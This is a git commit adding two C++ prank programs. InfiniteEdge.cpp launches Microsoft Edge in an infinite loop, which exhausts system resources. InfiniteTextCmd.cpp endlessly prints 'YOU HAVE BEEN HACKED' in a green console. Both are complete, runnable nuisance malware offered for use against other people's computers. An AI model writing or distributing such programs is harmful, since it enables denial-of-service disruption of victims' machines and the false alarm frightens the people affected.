79b863dd831e149891039f704cdb78632c1f1050
Cheeto The Cheater <138292864+CheetoTheCheater@users.noreply.github.com>
2023-07-03 20:14:21 +0300

    Add files via upload

---
+++ C++/InfiniteEdge.cpp
@@ -0,0 +1,8 @@
+#include <stdlib.h>
+int main() {
+	system("cd C:\\Program Files (x86)\\Microsoft\\Edge\\Application");
+	while(true){
+		system("start msedge.exe");
+	};
+    return 0;
+}
---
+++ C++/InfiniteTextCmd.cpp
@@ -0,0 +1,8 @@
+#include <stdlib.h>
+int main() {
+    system("color 02");
+	while(true){
+		system("echo YOU HAVE BEEN HACKED LOLOLOLOLOLOLOLOL");
+	};
+    return 0;
+}
